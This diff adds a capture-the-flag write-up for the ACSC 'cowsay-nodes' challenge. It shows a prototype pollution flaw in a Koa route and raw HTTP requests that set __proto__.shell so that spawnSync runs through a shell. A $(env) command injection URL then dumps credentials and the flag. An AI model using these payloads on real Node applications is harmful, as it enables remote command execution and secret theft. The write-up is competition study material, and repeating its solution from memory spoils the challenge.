@@ -1,0 +1,86 @@
+Name: __proto__
+
+Vuln (prototype pollution)
+```
+router.post('/setting/:name', (ctx, next) => {
+  if (!settings[ctx.state.user]) {
+    settings[ctx.state.user] = {};
+  }
+  const setting = settings[ctx.state.user];
+  setting[ctx.params.name] = ctx.request.body.value;
+  ctx.redirect('/cowsay');
+});
+```
+
+https://nodejs.org/api/child_process.html#child_process_child_process_spawnsync_command_args_options
+```
+If the shell option is enabled, do not pass unsanitized user input to this function. Any input containing shell metacharacters may be used to trigger arbitrary command execution.
+```
+
+Malicious Request
+```
+POST /setting/shell HTTP/1.1
+Host: cowsay-nodes.chal.acsc.asia:62279
+Content-Length: 15
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://cowsay-nodes.chal.acsc.asia:62279
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://cowsay-nodes.chal.acsc.asia:62279/cowsay?user=__proto__
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7
+Cookie: username=__proto__
+Connection: close
+
+value=/bin/bash
+```
+
+setting = {}
+setting.__proto__.shell = /bin/bash
+
+
+http://cowsay-nodes.chal.acsc.asia:62279/cowsay?say=$(env)
+```
+/ HOSTNAME=fd337f3d645f                   \
+| CS_USERNAME=KbmCQJlaeZzcnypA            |
+| shell=/bin/bash YARN_VERSION=1.22.5     |
+| color=#000000 PWD=/usr/src/app          |
+| CS_PASSWORD=MBQlIEjadxRHuLOf            |
+| HOME=/home/node                         |
+| FLAG=ACSC{(oo)<Moooooooo_B09DRWWCSX!}   |
+| SHLVL=0                                 |
+| PATH=/usr/local/sbin:/usr/local/bin:/us |
+| r/sbin:/usr/bin:/sbin:/bin              |
+\ NODE_VERSION=16.9.1 _=/usr/bin/env      /
+ -----------------------------------------
+        \   ^__^
+         \  (oo)\_______
+            (__)\       )\/\
+                ||----w |
+                ||     ||
+```
+
+
+
+=============== Another Payload (shell = true) ===============
+
+```
+POST /setting/shell HTTP/1.1
+Host: cowsay-nodes.chal.acsc.asia:62279
+Content-Length: 14
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+http://cowsay-nodes.chal.acsc.asia:62279
+Content-Type: application/json
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://cowsay-nodes.chal.acsc.asia:62279/cowsay?user=__proto__
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7
+Cookie: username=__proto__
+Connection: close
+
+{"value":true}
+```
